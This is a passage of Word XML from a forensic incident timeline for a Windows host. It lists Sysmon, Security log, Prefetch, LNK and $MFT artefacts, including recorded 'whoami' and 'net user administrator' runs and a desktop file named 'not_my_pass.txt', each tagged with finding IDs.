          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-007, T-010, T-020</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:25.703963</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>whoami  /user</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 7220, ProcessGUID: e6e9f951-1055-654e-cb01-000000000500 | RuleName: - | MD5=2EEEEC89E705F73FFBCAE014E1828788,SHA256=A8A4C4719113B071BB50D67F6E12C188B92C70EEAFDFCD6F5DA69B6AAA99A7FD,IMPHASH=7FF0758B766F747CE57DFAC70743FB88 | ParentProcess: C:\Windows\System32\cmd.exe | ParentProcessID: 5848, ParentProc</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18694</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-007, I-009, T-010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:35.759974</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>NET.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=61E7A54D False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#81</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\prefetch\NET.EXE-61E7A54D.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-007</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:35.772808</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>net  user administrator</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 736, ProcessGUID: e6e9f951-105f-654e-cc01-000000000500 | RuleName: - | MD5=A63DF9A6E9098CC189F2A3EFC37600F6,SHA256=96CDFD7B263947A6A7C0DB54141A6B8D7777DB0A03A17CBF95666D98422F937B,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07 | ParentProcess: C:\Windows\System32\cmd.exe | ParentProcessID: 5848, ParentProce</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18695</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-007, I-009, T-010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:35.775558</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>NET1.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=1C88A7BA False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#82</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\prefetch\NET1.EXE-1C88A7BA.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-007, T-020</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:35.786440</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Windows\system32\net1  user administrator</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 1152, ProcessGUID: e6e9f951-105f-654e-cd01-000000000500 | RuleName: - | MD5=0F641F87A791AE07C00A725BBBD77724,SHA256=286E7F127B06386BD1CC9664851848F483A867F0F604AA352893151068715FAA,IMPHASH=41DBA1AF77E1A2260F0CE46D59ADCB5E | ParentProcess: C:\Windows\System32\net.exe | ParentProcessID: 736, ParentProce</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18696</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-007, F-012, T-012</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:35.796776</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Security 4798 | Microsoft-Windows-Security-Auditing | A user's local group membership was enumerated | Target: DESKTOP-KJ81A5A\Administrator (S-1-5-21-1841083384-974204330-411256071-500) | SubjectLogonId: 0x15347 | CallerProcessName: C:\Windows\System32\net1.exe | CallerProcessId: 0x480</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#27065</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-007, F-012, T-012</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:35.806786</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Security 4798 | Microsoft-Windows-Security-Auditing | A user's local group membership was enumerated | Target: DESKTOP-KJ81A5A\Administrator (S-1-5-21-1841083384-974204330-411256071-500) | SubjectLogonId: 0x15347 | CallerProcessName: C:\Windows\System32\net1.exe | CallerProcessId: 0x480</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#27066</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-012</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:46.104556</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t xml:space="preserve">"C:\Users\medmondson\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe" /update /restart /updateSource:ODU </w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 7932, ProcessGUID: e6e9f951-1069-654e-ce01-000000000500 | RuleName: - | MD5=6CB3F2707BDB8F78FE81E8A20790A4B9,SHA256=F580F8C17F1B8F7EDE556A6C8060B8B6B84862B380EB43F2AD3E91D048A3F7B9,IMPHASH=830D771EB3CF1FC69DCD5AFD0A4A2D9A | ParentProcess: C:\Users\medmondson\AppData\Local\Microsoft\OneDrive\OneDrive.e</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18698</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:46.742007</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Security 4798 | Microsoft-Windows-Security-Auditing | A user's local group membership was enumerated | Target: DESKTOP-KJ81A5A\medmondson (S-1-5-21-1841083384-974204330-411256071-1001) | SubjectLogonId: 0x153A9 | CallerProcessName: C:\Windows\System32\notepad.exe | CallerProcessId: 0x3A4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#27067</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-015</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:54.651364</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 11 | Microsoft-Windows-Sysmon | FileCreate | ProcessID: 1136, ProcessGUID: e6e9f951-0901-654e-1a00-000000000500 | RuleName: T1053 | Image: C:\Windows\system32\svchost.exe | TargetFilename: C:\Windows\System32\Tasks\OneDrive Standalone Update Task-S-1-5-21-1841083384-974204330-411256071-1001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18927</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:54.724308</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 13 | Microsoft-Windows-Sysmon | RegistryEvent (Value Set) | ProcessID: 3488, ProcessGUID: e6e9f951-106b-654e-cf01-000000000500 | RuleName: T1060,RunKey | Image: C:\Users\medmondson\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe | EventType: SetValue | TargetObject: HKU\S-1-5-21-1841083384-974204330-411256071-1001\Software\Microsoft\Windows\CurrentVer</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18928</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:56</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>LNK files</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>LNK modified (≈ last opening) ; Target: created (recorded in the LNK) ; Target: modified (recorded in the LNK) ; Target: accessed (recorded in the LNK)</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\Desktop\not_my_pass.txt</w:t>
              <w:br/>
              <w:t>machine=desktop-kj81a5a MAC=00:0c:29:27:f7:8f volume=026F16D0 Fixed storage media (Hard drive) size=38</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>lecmd/lnk_C.csv#12</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\users\medmondson\Appdata\Roaming\Microsoft\Windows\Recent\not_my_pass.txt.lnk</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-015</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:56.556811</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B)</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\Desktop\not_my_pass.txt</w:t>
              <w:br/>
              <w:t>size=38</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#112639</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
